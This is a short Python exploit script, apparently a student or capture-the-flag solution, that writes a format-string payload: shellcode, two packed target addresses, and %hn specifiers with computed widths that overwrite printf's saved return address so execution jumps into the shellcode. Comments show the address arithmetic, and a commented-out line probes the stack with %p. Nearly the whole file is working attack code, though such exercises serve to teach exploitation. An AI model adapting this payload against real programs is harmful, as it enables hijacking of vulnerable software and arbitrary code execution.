#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
printf_ret_addr = 0xfffeb650
buf_addr = 0xfffeae4c # 0xfffe=65534 0xae4c=44620

# 0xae4c -> 0xfffeb650
# 0xfffe -> 0xfffeb652

# 44620 - 32 = 44588
# 65534 - 44620 = 20914
sys.stdout.buffer.write(shellcode + b"A" + pack("<I", printf_ret_addr) + pack("<I", printf_ret_addr+2) + b"%44588x%7$hn%20914x%8$hn")

#sys.stdout.buffer.write(shellcode + b"A" + pack("<I", printf_ret_addr) + pack("<I", printf_ret_addr+2) + b"%p"*8)
